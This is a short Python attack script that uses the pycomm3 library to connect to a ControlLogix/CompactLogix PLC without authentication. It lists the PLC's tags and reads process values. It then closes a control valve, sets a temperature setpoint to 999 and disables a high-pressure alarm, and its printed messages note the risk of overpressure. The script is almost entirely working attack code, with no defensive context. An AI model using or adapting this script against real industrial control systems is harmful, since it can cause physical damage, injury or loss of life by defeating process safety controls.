from pycomm3 import LogixDriver

def exploit_logix_plc(target_ip):
    """
    Read and manipulate tags in ControlLogix/CompactLogix PLC
    No authentication required by default
    """
    with LogixDriver(target_ip) as plc:
        # Enumerate all tags
        print("[*] Enumerating PLC tags...")
        tags = plc.get_tag_list()

        for tag in tags:
            print(f"Tag: {tag['tag_name']}, Type: {tag['data_type']}")

        # Read critical process variables
        print("\n[*] Reading process values...")
        temp = plc.read('Temperature_Sensor_01')
        pressure = plc.read('Pressure_Transmitter_01')
        valve_pos = plc.read('Control_Valve_Position')

        print(f"Temperature: {temp.value}")
        print(f"Pressure: {pressure.value}")
        print(f"Valve Position: {valve_pos.value}%")

        # Malicious manipulation
        print("\n[!] Executing attack...")

        # Attack 1: Close critical valve
        plc.write('Control_Valve_Position', 0)  # 0% = fully closed
        print("[+] Valve closed (may cause overpressure)")

        # Attack 2: Modify setpoint
        plc.write('Temperature_Setpoint', 999)
        print("[+] Temperature setpoint set to dangerous level")

        # Attack 3: Disable alarms
        plc.write('High_Pressure_Alarm_Enabled', False)
        print("[+] Safety alarms disabled")

# exploit_logix_plc('192.168.1.100')
